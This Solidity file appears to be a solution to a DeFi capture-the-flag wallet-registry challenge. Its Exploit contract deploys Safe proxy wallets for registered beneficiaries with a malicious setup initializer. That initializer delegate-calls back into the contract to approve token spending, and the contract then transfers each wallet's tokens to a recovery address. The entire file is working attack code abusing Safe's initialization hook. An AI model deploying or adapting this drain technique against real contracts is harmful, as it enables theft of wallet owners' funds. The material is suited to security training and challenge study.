// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {
    SafeProxyFactory,
    SafeProxy,
    IProxyCreationCallback
} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";

contract Exploit {
    address private immutable singletonCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable dvt;
    address recovery;

    constructor(address _masterCopy, address _walletFactory, address _registry, address _token, address _recovery) {
        singletonCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _registry;
        dvt = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function attack(address[] memory _beneficiaries) external {
        // Loop through all beneficiaries
        for (uint256 i = 0; i < 4; i++) {
            // Create an owners array with just the beneficiary
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Create initialization data for the new wallet
            bytes memory _initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                beneficiary, // The beneficiary is the owner
                1, // Threshold of 1 signature
                address(this), // Delegate call to THIS exploit contract
                abi.encodeWithSignature("delegateApprove(address)", address(this)), // Call our backdoor
                address(0), // No fallback handler
                0,
                0,
                0 // No payment parameters
            );

            // Create the wallet on behalf of the beneficiary
            SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
                singletonCopy, // Singleton implementation
                _initializer, // Our malicious initialization data
                i, // Salt nonce (using loop counter)
                IProxyCreationCallback(walletRegistry) // Registry callback
            );

            // Transfer tokens to the recovery address
            dvt.transferFrom(address(_newProxy), recovery, 10 ether);
        }
    }

    // This function is called via delegate call during wallet initialization
    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }
}
